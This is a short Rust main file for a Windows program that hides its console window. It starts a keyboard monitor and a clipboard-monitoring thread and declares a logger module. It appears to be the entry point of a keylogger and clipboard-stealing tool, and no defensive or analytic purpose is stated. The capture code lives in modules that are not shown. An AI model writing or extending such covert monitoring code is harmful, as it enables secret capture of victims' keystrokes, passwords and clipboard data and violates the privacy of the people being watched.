#![windows_subsystem = "windows"]

mod clipboard;
mod keyboard;
mod logger;

use std::thread;
use std::time::Duration;

pub fn main() {
    keyboard::monitor_keyboard();
    thread::spawn(|| {
        clipboard::monitor_clipboard();
    }).join().expect("failed to spawn thread");
}
